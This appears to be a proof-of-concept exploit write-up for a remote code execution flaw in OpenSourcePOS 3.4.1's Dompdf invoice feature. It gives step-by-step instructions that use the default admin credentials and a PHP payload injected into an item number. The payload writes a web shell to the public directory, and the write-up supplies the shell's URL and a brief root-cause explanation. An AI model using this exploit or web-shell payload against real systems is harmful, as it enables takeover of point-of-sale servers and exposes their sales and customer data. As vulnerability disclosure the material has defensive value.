# OpensourcePOS-3.4.1-RCE
RCE via PHP in Dompdf invoice feature

1. Log in with an account that has Items and Sales access. This POC uses the seeded default credentials which are admin:pointofsale
   
2.Create a customer with a nonempty email address.

3. Create a disposable item with a normal item number.

4. Complete an invoice containing that item and note its sale ID at the bottom of the invoice.

5. Edit the item and replace its item number with
<script type="text/php">file_put_contents('/app/public/diag.php',"<?php echo shell_exec(\$_REQUEST['cmd'] ?? 'id'); ?>");</script>

While authenticated, request:

http://127.0.0.1:8081/sales/sendPdf/<SALE_ID>

Dompdf renders invoice_email.php. In OSPOS 3.4.1, the item number is inserted without escaping and Dompdf has embedded PHP enabled. Rendering executes the script and writes /app/public/ diag.php.

Enjoy your shell at

http://127.0.0.1:8081/diag.php?cmd=id

Root cause: OSPOS stores an attacker-controlled value in the item’s Item Number/Barcode field. After that item is included in a completed invoice, requesting /sales/sendPdf/<sale_id> places the current item number into the invoice’s HTML without escaping it. Dompdf renders that HTML with embedded PHP enabled, interprets the injected <script type="text/php"> block as executable PHP, and runs it as the web-server user.
